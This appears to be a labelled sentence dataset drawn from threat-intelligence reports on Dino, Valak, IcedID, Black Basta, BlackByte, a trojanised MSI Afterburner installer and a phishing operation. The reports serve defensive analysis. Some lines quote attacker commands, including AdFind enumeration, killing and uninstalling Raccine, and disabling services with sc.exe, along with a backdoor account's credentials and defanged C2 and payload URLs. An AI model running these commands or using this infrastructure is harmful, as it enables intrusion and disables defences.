0	ComServer: These keys contain the command and control (C&C) servers URLs.
0	For the record, a d13 folder has been seen on another Animal Farm C&C (see 3.7 Calling home of Marschaleks Babar report), indicating that Dino version 1.3 has also likely been deployed at some point.
0	Those C&Cs were compromised legitimate websites, which is standard operating procedure for Animal Farm.
0	Version: Dinos code version; here set to 1.2, which is confirmed by the din12 folder used in one of the C&C URLs.
0	After having described Dinos basics, we are now going to dig into two particularly interesting components; first, a custom file system used by the malware, and then the CRONTAB module in charge of task scheduling.
0	RamFS: A Temporary File System
0	Dino contains a custom file system named ramFS by its developers.
0	It provides a complex data structure to store files in memory, each of them bearing a name corresponding to filenames used by usual file systems.
0	RamFS also comes with a set of custom commands that can be stored in files and executed.
0	It should be noticed that ramFS is also present in other Animal Farm binaries (see attribution paragraph below), but since we are unaware of previous analysis of ramFS, we are describing our findings here.
0	Here are some high-level characteristics of this file system:
0	File names and file content are encoded in Unicode
0	File names length is limited to 260 characters
0	Once decrypted, file content is manipulated as chunks of 540 bytes
0	There is no metadata associated with the files
0	We could not find an existing file system matching the memory structures and the characteristics of ramFS, and therefore we believe this file system to be an original creation of the Animal Farm group.
0	Several commands can be executed in the context of ramFS, as listed in the following Table.
0	Hence, ramFS serves as a protected container for files to be executed on the machine, offering a disposable execution environment to the operators and leaving very few traces on the system.
0	The commands cronadd, cronlist and crondel serve respectively to add, list, and remove scheduled tasks registered in the CRONTAB module.
0	Those tasks are Dinos commands.
0	The syntax to define scheduled tasks is similar to the one used by the cron Unix command.
0	In particular the time at which to run a command is given by a string following the format minute hour day month year dayofweek.
0	Alternatively, this string can be replaced by @boot for a command to run at each startup  whereas some Unix cron implementations accept @reboot.
0	As an example, here is the output of the cronlist command after a wakeup command has been scheduled to run on 7th April 2015 at 15:44:
0	As we can see, each entry is identified by an Id, an incrementing hexadecimal number starting at 0xC0.
0	The purpose of the Local field remains unclear (the other possible value being -l).
0	The Count parameter counts the number of times a command has been executed, -1 indicating the command will be executed only once.
0	The amount of shared code between Dino and known Animal Farm malware leaves very little doubt that Dino belongs to Animal Farms arsenal.
0	Among these shared features, we can cite the following:
0	At the very beginning of Dino execution, the current process name is checked against process names used by some sandboxes:
0	To hide its calls to certain API functions, Dino employs a classic Animal Farm ploy: a hash is calculated from the functions name and used to look for the address of the API function.
0	The actual hashing algorithm used in Dino is the same that was used in Casper, namely a combination of rotate-left (ROL) of 7 bits and exclusive-or (XOR) operations.
0	The Dinos custom file system  the so-called ramFS  is present in several droppers used by Animal Farm.
0	In those binaries the file system serves to set the persistence of the payload.
0	For example, here is the command executed by some NBOT droppers in the context of ramFS:
0	As a final indication that Dino belongs to Animal Farm menagerie, it is noticeable that the output of Dinos sysinfo command looks like an updated version of the beacon from the SNOWBALL implant described in the leaked CSE slides  part of operation SNOWGLOBE, which led to the discovery of Babar:
0	Login/Domain (owner): Administrator/JOHN (john)
0	All these indicators together make us very confident that Dino was developed by the Animal Farm group.
0	Dino adds at least two more indicators to those already documented suggesting that Animal Farm developers are French speaking:
0	Dinos binary contains a resource whose language code value is 1036.
0	The original purpose of this language code is to allow developers to provide resources (menus, icons, version information) for different locations in the world in the corresponding language.
0	Interestingly, when a developer does not manually specify the language code, the compiler sets it to the language of the developers machine.
0	So, which language corresponds to the value 1036, or 0x40c in hexadecimal?
0	Of course a non-French speaking developer could have deliberately set this value to mislead attribution efforts.
0	But in more recent Animal Farm binaries (for example Casper), this language code has been set to the classical English (USA) language code.
0	Therefore, it seems that Animal Farm developers forgot to set this value in their first creations, realized their mistake at some point, and decided to set a standard value.
0	The GnuMP code in Dino contains file paths coming from the developers machine:
0	..\..\src\arithmetique\mpn\mul.c
0	..\..\src\arithmetique\printf\doprnt.c
0	As the attentive reader has probably guessed, arithmetique is the French translation of arithmetic.
0	But Dino also shows a poor knowledge, or interest, from these developers in anti-analysis techniques  contrary to what was seen in Casper  as demonstrated, for example, by the verbosity of some Dinos log messages:
0	These signs add to the pretty long list of indicators already supporting this hypothesis, in particular the ones mentioned by Canadas CSE.
0	Now, if we search for it using \x63\xB0\x55\x4E, we find this module for a Metasploit Framework:
0	Besides the date and time information, we also have a very generic username of the file creator: USER.
0	The shortcut has a hardcoded path to the icon, so the proper image will be shown only if the user has the browser installed on their computer.
0	Knowing the self-extracting archive compilation date allows us to find the WinRAR software version used by the attacker.
0	Moving on, to get the archive password we have to check the shortcut that is linked to it.
0	The file is a 7zip SFX archive that tries to look like a mysterious version of Email Microsoft Office Word software.
0	Although the last modification date is set to 10.04.2019 13:55:42 (GMT), the compilation timestamp is 05.03.2016 12:06:17 (GMT).
0	Unfortunately, none of the 7zip software release dates or versions corresponds to this timestamp, so our previous discovery technique did not work in this case.
0	This self-extracting archive contains two files and a script that is launched at extraction:
0	!@Install@!UTF-8!
0	RunProgram="hidcon:5493.cmd" (Run batch file with hidden console window after extraction)
0	SelfDelete="1" (Delete the archive after extraction)
0	To search for any hints of the software used to create this self-extracting archive, we looked into the file with just a text editor.
0	This time, searching for the copyright, versions, and script we found a custom tool called Modified 7-Zip SFX module for installers, version 1.6.1 Stable build 3873 was used to create the malicious file.
0	Looking into the batch file, we can see that it was not very obfuscated and therefore easy to read.
0	The first thing we can see is the configuration information.
0	Apparently, the attackers decided to not reinvent the wheel and simply used an open-source solution for exfiltrating the host data and downloading the main payload.
0	The shortcuts used in Windows are small files that simplify our lives by providing a fast way to access files, applications, and URLs.
0	If you switch your keyboard layout to Russian and type the password characters, you eventually recover an obscene phrase in Russian: **, that is translated as American b**tards.
0	So the rest of the string  fvthbrfycrbte,k.lrb is the password.
0	First noted in late 2019, Valak is an information stealer and malware loader that has become increasingly common in our threat landscape.
0	From April through June of 2020, we saw waves of Valak malware two to four times a week on average through an email distribution network nicknamed Shathak or TA551.
0	Recent Valak infections show an increase in obfuscated code for configuration scripts used during the infection, possibly as an attempt to avoid detection.
0	Since April 2020, we have seen a great deal of Valak malware distributed by an actor sometimes referred to as Shathak/TA551.
0	This blog covers the history of Valak, reviews the chain of events for an infection, examines traffic generated by Valak and explores recent updates in obfuscation techniques used by the malware in order to evade detection.
0	The earliest public record of Valak comes from Proofpoint's ET Pro ruleset, where two rules detecting Valak were introduced on October 22, 2019, for the Suricata Open Source threat detection engine.
0	Valak was documented as follow-up malware during an Ursnif infection (also known as Gozi or IFSB) on December 19, 2019.
0	Analysis by Cybereason revealed Valak used a combination of techniques to remain persistent on an infected Windows host.
0	SentinelLabs (SentinelOne) published a report providing further information about Valak, including a connection between Valak malware distribution and campaigns similar to the Gozi ConfCrew.
0	The distribution network using malspam to push Valak has been called Shathak on Twitter.
0	Shathak has been attributed to an actor named TA551 on the Malware Dont Need Coffee blog.
0	Distribution characteristics were further explored in a Threat Spotlight on Valak published by Talos (Cisco).
0	This is an example of obfuscation that we have noted since June 2020, and it is covered in more detail later in this blog when discussing Valak developments.
0	EXE file with a .bin file extension from the June 24, 2020, Valak infection.
0	Contents of the JS file used to keep the Valak infection persistent.
0	Scheduled task for JS file used to keep the Valak infection persistent.
0	In our tests, running Valak from a U.S. location on a vulnerable Windows 10 host returned a banking Trojan called IcedID as the follow-up malware.
0	In one case, we saw both IcedID and NetSupport Manager RAT-based malware delivered as follow-up malware on a Windows 7 host from June 2020.
0	For example, for Valak infections from the June 24, 2020, wave, the decoy domains were:
0	pagead46.l.doubleclick.net
0	Also noted in Figure 5 are the malicious domains from the June 24, 2020, wave of Valak:
0	thepicklepilot.com
0	Figure 5 also shows three additional domains from the June 24, 2020, wave of Valak.
0	We primarily see IcedID as follow-up malware from the Valak infections generated from U.S. locations.
0	Figure 19 shows indicators of IcedID during the Valak infection traffic.
0	As Valak has developed, we have noticed increased obfuscation in the Valak configuration script.
0	This obfuscation finds its way into other script and Windows registry updates used to keep the infection persistent.
0	Figure 20 shows configuration script from June 23, 2020, using Valak software version 40.
0	Figure 21 shows configuration script from June 24, 2020, using Valak software version 41.
0	Note how variable names and some of the values were obfuscated when Valak changed from version 40 to version 41.
0	Shathak or TA551 is the name some security researchers have given to a specific distribution method that uses password-protected ZIP archives as attachments to malspam.
0	The distribution network may be associated with Russian cybercriminals.
0	It has used Word document templates targeting English-, Italian-, German- and Japanese-speaking recipients.
0	Appendix B lists examples of URLs from this campaign.
0	Prior to April 2020, the most common malware caused by Word documents associated with Shathak/TA551 was Ursnif.
0	Since April 2020, the most common malware distributed by these Word documents has been Valak.
0	Appendix C lists a series of Valak DLL examples from June 2020.
0	Since May 2020, passwords used for the ZIP attachments appear to be unique to each recipient.
0	2020-05-26 - hxxp://c1j4xptyujjpyt8[.
0	]com/gg88wyaftcxr7gu/wo0zz.php?l=sfzs9.cab
0	2020-05-27 - hxxp://ft23fpcu5yabw2[.
0	As noted previously, Appendix B provides more examples of these URLs generated by Word macros associated with Shathak/TA551.
0	Figures 22-30 provide screenshots with selected examples of malspam and the extracted Word documents associated with Shathak/TA551.
0	These images illustrate how the Shathak/TA551 distribution has evolved since February 2019.
0	Shathak/TA551 malspam to an English-speaking recipient from February 4, 2019.
0	Shathak/TA551 malspam to a German-speaking recipient from October 30, 2019.
0	This distribution network has generally pushed Ursnif in previous years, but since late April 2020, weve most often seen Valak from Shathak/TA551.
0	Information available at: https://raw.githubusercontent.com/pan-unit42/iocs/master/Valak/2020-03-23-to-2020-07-07-TA551-traffic-pattern-history-since-Valak.txt
0	Examples of SHA256 file hashes along with the associated file names for Word documents from Shathak/TA551 distribution during June 2020.
0	By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
1	Whenever  an instance of  explorer.exe is launched (i.e., at every system startup), the system searches for the said .DLL file and loads it.EvilGrab drops one of  its .DLL components in the Windows folder, where explorer.
1	The numbers provided throughout this blog are based on an approximation derived from sampled threat telemetry.Delivery MethodsOf the campaigns analyzed, the following methods were used for malware delivery:Password Protected ZIP -> ISO -> LNK -> JS -> [CMD or BAT] -> DLL Delivery was via a password protected zip file that contained an ISO which itself contained a LNK file and archive holding the files used for IcedID installation.
1	When the LNK file is clicked by the user, it functions as a shortcut to run a script within the archive that ultimately installs IcedID from a DLL.
1	It is typically launched through either a CMD or BAT script, depending on which was included in the archive.Password Protected ZIP -> ISO -> CHM -> DLLDelivery was via a password protected zip file containing an ISO that led to a CHM (Compiled HTML) file.
1	The victim must open the file to launch the DLL and complete the infection process.
1	MaldocUsers received either a malicious Word or Excel file that asked them to enable macros, which then allowed the embedded script to execute and install IcedID.PrivateLoaderDelivery was through PrivateLoader, a pay-per-install service that distributes malware by hiding it in free software downloaded by unsuspecting users.
1	The Italian lure was in the form of a malicious .docm file with kolinandod[.]com as the C2, which was set to resolve to 159.203.5[.]238 on 12 September.
1	The lure targeting English speakers arrived using the following delivery method:Password Protected ZIP -> ISO -> LNK -> JS -> BAT -> DLLThe C2 was qvantumbrakesz[.]com, which resolves to 134.209.97[.]90.
1	Password Protected ZIP -> ISO -> CHM -> DLLNote: The use of CHMs was first spotted in a IcedID campaign on 8 August 2022, but the use of this file-type maliciously is a technique that has been around for several years.
1	The C2 was allozelkot[.]com and was set to resolve to 188.166.169[.]40 on the day of the campaign.
1	Seeing domains and IPs reused for Stage 2 bot C2s is not uncommon, but this is the first case of a Stage 1 downloader C2 reusing either since at least mid-August 2022.The campaign on September 15 (project ID 612758225) used the delivery method:Password Protected ZIP -> ISO -> LNK -> JS -> BAT -> DLLThe second campaign (project ID 3747825559), seen on 16 September, was delivered as an EXE dropped by PrivateLoader.There were around 79 potential victims and most of them first communicated with the C2 on 16 September.
1	Delivery consisted of a password protected zip file containing an ISO:Password Protected Zip -> ISO -> LNK -> DLLThe C2 was aviadronazhed[.]com, which was updated to resolve to 67.205.169[.]96 on the day of the campaign.
1	T2 traffic began about two and half hours after the victim traffic (17:30 UTC) and lasted around two and half hours after the last port 80 request (20:30 UTC).
1	Oddly, the C2 was then disconnected from the T2 instead of continuing to communicate for the usual period of approximately six days.Another oddity was that unlike other C2s where domains remained on the same IPs at the conclusion of a campaign, this domain was updated and removed from 67.205.169[.]96 on 22 September
1	For delivery it used a password protected zip file and ISO:Password Protected ZIP -> ISO -> LNK -> BAT -> DLLTwo campaigns were seen on 21 September, each with a unique project ID and domain: nikolandfantazy[.]com (project ID 1367965656) and zalikomanperis[.]com (project ID 2432960414).
1	The delivery was via a password protected zip containing an ISO:Password Protected ZIP -> ISO -> LNK -> JS -> CMD -> DLLThere were 29 potential victims from when the C2 was active between 20 - 27 September, with the last communication from a unique IP on port 80 happening on the 26 September.
1	These campaigns fell outside of the timeframe we were focusing on but due to their peculiarities we thought it would be interesting to add for comparison.9 SeptemberThe lure for this campaign (project ID 3207262051) was meant to be an XLSM file for English-speakers, but the threat actors used the Italian word for View on the button they wanted to convince users to click.
1	Figure 1  Screenshot from Hatching TriageThe C2 for this campaign was audifastinggip[.]com and it began resolving to 143.198.178[.]0 on 9 September.
1	Until 13 September around 12 potential victims were curious enough to click the Visualizza button, and communication with the T2 ended on 15 September.
1	22-23 SeptemberIt appears a key component of the process may have been skipped when setting up the C2 on 22 September (project ID 1023645195).
1	The C2 was trallfasterinf[.]com, and it resolves to 137.184.114[.]20.
1	The C2 for 23 September (project ID 2349072319) was sebdgoldingor[.]com, and it also resolves to 137.184.114[.]20.
1	Two campaigns seen the following Monday on 26 September contained the expected T2 traffic, so it appears the threat actors may have had a bit of a mishap with 137.184.114[.]20.Analysis/Key FindingsGEO TargetingThe 13 September campaign targeting Italian speakers resulted in 18 potential victims.
1	Along with other researchers, we noted that Black Basta infections began with Qakbot delivered by email and macro-based MS Office documents, ISO+LNK droppers and .docx documents exploiting the MSDTC remote code execution vulnerability, CVE-2022-30190.
1	One of the interesting initial access vectors we observed was an ISO dropper shipped as Report Jul 14 39337.iso that exploits a DLL hijacking in calc.exe.
1	Once the user clicks on the Report Jul 14 39337.lnk inside the ISO dropper, it runs the commandcmd.exe /q /c calc.exetriggering the DLL hijacking inside the calc binary and executing a Qakbot DLL, WindowsCodecs.dll.
1	Qakbot obtains a persistent foothold in the victim environment by setting a scheduled task which references a malicious PowerShell stored in the registry, acting as a listener and loader.
1	The powershell.exe process continues to communicate with different servers, waiting for an operator to send a command to activate the post-exploitation capability.
1	When an operator connects to the backdoor, typically hours or days after the initial infection, a new explorer.exe process is created and a process hollowing is performed to hide malicious activity behind the legitimate process.
1	The first step in a Black Basta compromise usually involves executing a uniquely obfuscated version of the AdFind tool, named AF.exe.
1	cmd /C C:\intel\AF.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > C:\intel\[REDACTED].csv
1	This stage also often involves the use of two custom .NET assemblies loaded in memory to perform various information gathering tasks.
1	These assemblies are not obfuscated and the main internal class names, Processess and GetOnlineComputers, provide a good clue to their functions.
1	Black Basta operators have been observed using SharpHound and BloodHound frameworks for AD enumeration via LDAP queries.
1	The collector is also run in memory as a .NET assembly.
1	For network scanning, Black Basta uses the SoftPerfect network scanner, netscan.exe.
1	In one intrusion, we observed the Black Basta operator exploiting the PrintNightmare vulnerability and dropping spider.dll as the payload.
1	The DLL creates a new admin user with username Crackenn and password *aaa111Cracke:Reversed code for spider.dll
1	The DLL first sets the user and password into a struct (userInfo) then calls the NetUserAdd Win API to create a user with a never-expiring password.
1	It then adds Administrators and Remote Desktop Users groups to that account.
1	Next, spider.dll creates the RunTimeListen.exe process, which runs the SystemBC (aka Coroxy) backdoor, described below.
1	At this stage, Black Basta operators cover their tracks by deleting the added user and the DLL planted with the PrintNightmare exploit.
1	The threat actor has been observed dropping a self-extracting archive containing all the files needed to run the Netsupport Manager application, staged in the C:emp folder with the name Svvhost.exe.
1	Execution of the file extracts all installation files into:C:\Users\[USER]\AppData\Roaming\MSN\Archive of installation files for Netsupport Manager dropped by Black Basta
1	The RAT is then executed through a run.bat script.
1	In the most recent Black Basta incidents we observed, a batch file named SERVI.bat was deployed through psexec on all the endpoints of the targeted infrastructure.
1	This script was deployed by the attacker to kill services and processes in order to maximize the ransomware impact, delete the shadow copies and kill certain security solutions.
1	Analysis of the tool led us to further samples, one of which was packed with an unknown packer.
1	After unpacking, we identified it as the BIRDDOG backdoor, connecting to a C2 server at 45[.]67[.]229[.]148.
1	In the example the file spider.png.blackbyte has been encrypted by BlackByte.
1	By using the key in forest.png, we can decrypt the file and retrieve spider.png.
1	At no time is the original encrypted file, spider.png.blackbyte, modified.
1	It has a worm functionality similar to RYUK ransomware.
1	It creates a wake-on-LAN magic packet and sends it to the target host - making sure they are alive when infecting them.
1	The author hosted the encryption key in a remote HTTP server and in a hidden file with .PNG extension.
1	The author lets the program crash if it fails to download the encryption key.
1	The RSA public key embedded in the body is only used once, to encrypt the raw key to display in the ransom note  thats it.
1	The main function of the obfuscated Jscript is to decode the main payload and launch it in the memory.
1	The payload is a .NET DLL (managed code) that contains a class named jSfMMrZfotrr.
1	The main purpose of this DLL is the following:
1	Add .JS and .EXE file extensions into Microsoft Defender's exclusion list.
1	Evade the Microsoft Antimalware Scan Interface (AMSI) DLL so that it will not scan the loaded malware and alert the user for suspicious activity.
1	Before encrypting, BlackByte first prepares the system so that nothing may hamper it from its file encryption routine.
1	During the initialization, the ransomware sets the value of essential fields such as the ransom notes, the encrypted file extension, cryptographic salt, OS name, among others.Victim identification is then generated by combining the infected systems processor ID and the volume serial number and hashing them with MD5.The ransomware creates a mutex named Global\1f07524d-fb13-4d5e-8e5c-c3373860df25 and terminates if that mutex name already exists.
1	Afterward, it checks if the system language locale is on its list of language codes  as shown below.
1	The ransomware also sets its process priority class to above normal and uses SetThreadExecutionState API to prevent the system from entering sleep.
1	Itthen removes applications and terminates processes that can hinder the encryption of the target files.
1	It enumerates the registry key:HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options
1	And then deletes the following subkeys:vssadmin.exe,wbadmin.exe,bcdedit.exe,powershell.exe,diskshadow.exe,net.exe,taskkill.exe,wmic.exe
1	BlackByte terminates Raccine, an anti-ransomware utility, and uninstalls it from the infected systemby running the command:,taskill.exe /F /IM Raccine.exe,taskill.exe /F /IM RaccineSettings.exe,schtasks.exe /DELETE /TN \"Raccine Rules Updater\" /F
1	It also deletes any Raccine related registry keys including:，HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunName = Raccine TrayHKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application\Raccine
1	It runs a series of SC commands to disable a list of services:，sc.exe config SQLTELEMETRY start = disabled，sc.exe config sc SQLTELEMETRY$ECWDB2 start = disabled，sc.exe config SQLWriter start = disabled，sc.exe config SstpSvc start = disabled，sc.exe config MBAMService start = disabled，sc.exe config wuauserv start = disabled
1	It also enables the following services:Dnscache，fdPHost，FDResPub，SSDPSRV，upnphost，RemoteRegistry
1	It uses the Microsoft Restart Manager API RmShutdown to terminate the following processes:，agntsvc，CNTAoSMgr，dbeng50，dbsnmp，encsvc，excel
1	The following living-off-the-land commands are also executed to delete all shadow copies on all volumes, delete Windows restore points, disable controlled folder access, enable network discovery, grant "everyone" full access to target drives, delete the recycle bin, enable file and printer sharing, and enable SMB1 protocol.
1	The ransomware sets the following registry settings to elevate local privilege, connect mapped drives, enable long paths:
1	BlackByte uses the mountvol.exe command to mount volume names and leverage the Microsoft Discretionary Access Control List tool  icacls.exe to grant the group to Everyone full access to the root of the drive.
1	This ransomware also has a worm capability.
1	It first checks if the file %AppData%\<Generated Victim ID> exists.
1	If this file does not exist, it means that the ransomware has not infected the network yet.
1	When the worm function is called, it initially sleeps for 10 seconds then queries at least 1,000 hostnames in the domain from the active directory.
1	network, BlackByte attempts to retrieve the defaultNamingContext from RootDSE from the Active Directory server, then it filters objects in the Active Directory identifying as computer and fetching a limit of up to 1,000 records.
1	It enumerates the returned record of hostnames, sends awake-on-lan magic packet and then pings the target hosts making sure they are alive.
1	BlackByte then proceeds to infect the host by copying itself to the path <hostname>\c$\Users\Public\obamka.js (if it has admin rights) or <hostname>\Users\Public\obamka.jsand then creates a scheduled task in the remote host to execute the file.
1	What we found interesting about this ransomware, is that it initially downloads a .PNG file from the link hxxp://45.9.148.114/forest.png which contains a key to be used later to encrypt the files.
1	If the ransomware fails to download the key, it will crash and will save the infected system from getting its files encrypted.
1	If the ransomware encounters a virtual hard drive file extension .vhd and .vhdx, it will attempt to dismount these drives using a PowerShell command:
1	To encrypt a file, it uses AES symmetric-key algorithm using the RFC2898 derived raw keys from the .png file.
1	In our case, the attribute files are created by calling device_create_file with attributes declared by the DEVICE_ATTR macro, which are:,name  Represents the attribute files name,mode  The permissions for attribute file,show  Function for reading from the attribute file
1	1. razer_attr_write_matrix_custom_frame receives the buffer that were writing to matrix_custom_frame as the buf argument.2.
1	Assigns row_id start_col and stop_col as the first, second and third bytes from the buf buffer, which we have complete controlover, as they are user input.
1	Passes the row_id, start_col, stop_col and the buf buffer, starting from the offset of the RGB data to razer_chroma_extended_matrix_set_custom_frame that callsrazer_chroma_extended_matrix_set_custom_frame2.
1	4.Calculates the row_length for the RGB values (each RGB value is three bytes long) based on start_col and stop_col.5.
1	Creates a new razer_report via get_razer_report that one of its members is a char array named arguments with the length of 80.6.
1	Puts the row_id (row_index), start_col and stop_col to the arguments buffer.7.
1	Copies row_length bytes from the buf buffer (rgb_data) to the arguments buffer.8.
1	Sends the new razer_report to the USB device.
1	The MSIAfterburnerSetup.msi installer file contains four executable files such as MSIAfterburnerSetup465Beta2.exe, install.exe, comp.cab, a cabinet file containing redline stealer, and browser_assistant.exe which loads XMR Miner.
1	When a user runs the MSIAfterburnerSetup.msi file, it further executes install.exe, which shows the installation wizard to install the program.
1	In the background, the installer drops a file named browser_assistent.exe in the %Program files% location and executes it.
1	Upon execution, the browser_assistent.exe Injects itself and loads a shellcode which gets the encoded XMR Miner binary from the GitHub repository and further injects it into explore.exe.
1	The malware installs XMR Miner silently in the background by injecting malicious code into a running process without saving the actual payload in the disk.
1	The loader browser_assistant.exe is a 64-bit PyInstaller executable with SHA256: 0e154eed00b71c0d11bd2caeb64fa2efcbb10524b797c076895752affa0f46c.
1	Upon execution of browser_assistant.exe, it drops multiple Python-supporting files into the %temp% directory.
1	During execution, it retrieves and injects the XMR Miner into explorer.exe using the following steps:
1	Initially, the Binary_Stub_Replacer.pyc decodes the actual data using replace function, converts the stub into binary format first, and then changes it into ASCII format, as shown in Figure 9.
1	The decoded stub forms a new python code containing an embedded base64 encoded content shown in Figure 10.
1	This python code decodes the base64encoded stub, which creates a shellcode.
1	Decoded python content (Stage 2)After that, the loaded Shellcode retrieves encoded raw data (XMR Miner) from the GitHub repository (hxxps[:]//raw.githubusercontent[.]com:443/CyberSECx/Dimitri_Quaser_LASTSM_B64/main/RawData), decodes it, injects it into explorer.exe and invokes the explorer.exe with the mining parameters shown in the below Figure 11.
1	Shellcode retrieves encoded XMR Miner content from GitHub
1	The injected XMR Miner further launches commands to connect the mining pool for crypto mining operations, as shown in the figure below.
1	Injected XMR mining pool details in the memory explorer.exe
1	The malware simultaneously collects sensitive information such as computer name, username, GPU, CPU, and other details from the victims system and sends them to the below C&C (Command and Control) server URL API:hxxp[:]//45[.]87[.]0[.]89/api/endpoint[.]php
1	Finally, the malware starts mining using the TAs wallet address on the victims machine to generate revenue.
1	On further analysis, we observed that the domainhas also hosteda fake Google Play Store page onthisURL:hxxps://acesso.sincronizadorltoken[.]com/playstore_downloadS34and hostedthefakeItaUnibancoapplication on it with 1,895,897 downloads(atthe time of our analysis)according to the websiteshown in Figure 6.
1	When the user clicks on theInstallbutton, the website will download a malicious application with the namesincronizador.apkfrom the URL:hxxps://acesso.sincronizadorltoken[.]com/playstore_downloadS34/sincronizador.apkas shown in Figure 7.
1	During oursource code review, we observed that the application uses customized AES/CBC algorithms to encrypt the strings,as shown in Figure 8.
1	The code snippet highlighted in Figure 9 shows that the application tries to open an application with the package namecom.itau.
1	We observed that this applicationtries toperform fraudulentfinancialtransactionsonthelegitimateItaUnibancoapplicationby tamperingwiththeusersinput fields.
1	It uses Word's external link to load the HTML and then uses the "ms-msdt" scheme to execute PowerShell code.https://t.co/hTdAfHOUx3 pic.twitter.com/rVSb02ZTwt nao_sec (@nao_sec) May 27, 2022
1	Onopening the malicious HTMLattachment,the user ispromptedtosubmitlogincredentialsforviewingPDF content,asdepictedinthefigure below.Our research indicates amalicious ActiveX componentthatautomaticallyrunsinthebackgroundas soon asthe user enables the document security control.This typeofPrecision Targeting involves advancedphishing attacksthat are difficult to detect and takedown by securityorganizations.
1	Theattached HTML page has a maliciousActiveXfunctionthat isused to sendtheharvested credentials tothe hackers serverusingasimple POST request,as shown below.
1	Thevictimsharvested credentialsmay be usedto gain unauthorized access and conduct further cyber espionage activities.Thecyberadversary may use the credentials to gain access to thetargeted infrastructureand stealconfidential information relatedto the COVID-19vaccine research and delivery.These sophisticatedphishing campaignsmayalso lead to furtherdamagessuch aspotentialdata breaches andundetectedsupply chain attacks.
1	In its new attack, the actor initiated the infection chain sending a spear-phishing email containing a macro-embedded Word document.
1	After the initial infection, a Visual Basic Script was delivered to the victim.
1	In this process, the actor abused a legitimate blog service to host a malicious script with an encoded format.
1	The implanted VBS file is capable of reporting information about infected machines and downloading additional payloads with an encoded format.
1	The final stage is a Windows executable-type malware that is capable of stealing information from the victim such as file lists, user keystrokes, and stored web browser login credentials.
1	The actor sends a spear-phishing email to the potential victim to download additional documents.
1	If the victim clicks the link, it results in a connection to the first stage C2 server, with an email address as parameter.
1	The first stage C2 server verifies the incoming email address parameter is an expected one and delivers the malicious document if its in the target list.
1	The first stage script also forwards the victims IP address to the next stage server.
1	When the fetched document is opened, it connects to the second C2 server.
1	The corresponding script on the second C2 server checks the IP address forwarded from the first stage server to check its an expected request from the same victim.
1	On top of that, the operator relies on several other processes to carefully deliver the next payload such as checking OS type and predefined user-agent strings.
1	As a result of analyzing the server-side script to convey a malicious document, we figured out how this actor verifies the request from the client and minimizes exposure of their payload.
1	This script works with a specific parameter name from the victim, so we suspect the actor delivers a download link to the victim via email or by sending a request using another type of payload.
1	It checks the who GET parameter from the victim.
1	The who parameter contains an email address without a domain name.
1	If the incoming request contains an expected email address, it saves the date, IP address and user-agent to the [who]_downhistory.txt file.
1	If the user-agent contains Windows, which means the victim is a Windows machine, it goes to the next step.Otherwise, it delivers a benign document to the victim.
1	Next, the script checks whether the connection from the victim is the first request or not by checking the existence of the [who].txt file.
1	If the [who].txt file does not exist, it means its the first request from the victim, so the script forwards the IP address to the other server (VBS server), delivering the malicious document, saving the victims information to the [who].txt including date, IP address and user-agent.
1	If the victim connects with an appropriate email address and if its an initial connection, the C2 script forwards the IP address to the specific servers with /index.php?ip= GET request.
1	Once this script receives an IP address in the ip parameter of the HTTP request, it extracts the victims IP address from ip parameter and saves it to the allow.txt file.
1	Otherwise, it saves the client information to the error.txt file and redirects the client to mail.google.com in this case.
1	Additionally, the author used various legitimate websites for redirection, such as naver.com, kisa.or.kr, or other popular email services.
1	The allow.txt file, which contains the appropriate victims IP address, is referred by another C2 script to verify whether the incoming request is valid and thus whether or not to deliver the next stage payload.
1	Also, we discovered that both malicious and benign documents are being delivered by this script.
1	The operator maintains a pair of documents, one benign (un.doc) and the other malicious (v.doc), and delivers the appropriate one depending on the result of the victim verification step.
1	Malicious documents delivered to the victim contain a macro to fetch the next stage payload.
1	The macro has a simple functionality and, interestingly, it spawns several child Windows command shells, probably intended for evading behavior-based analysis.
1	Eventually, the macro executes a fetched payload with the mshta.exe process that is designed to execute a Microsoft HTML Application.
1	Luckily, we discovered the corresponding C2 script (h.php) from our telemetry.
1	This script saves incoming traffic information to the log.txt file including the date, IP address, user-agent and the right-most 20 characters of the IP MD5 hash which is internally called TID (probably short for Target ID).
1	Next, it checks the presence of the allow.txt file that contains IP addresses of verified victims.
1	Only if the clients IP address exists in the allow.txt, is the next stage payload, h.txt, delivered.
1	Otherwise, the script delivers a short Visual Basic Script for terminating the mshta.exe process.
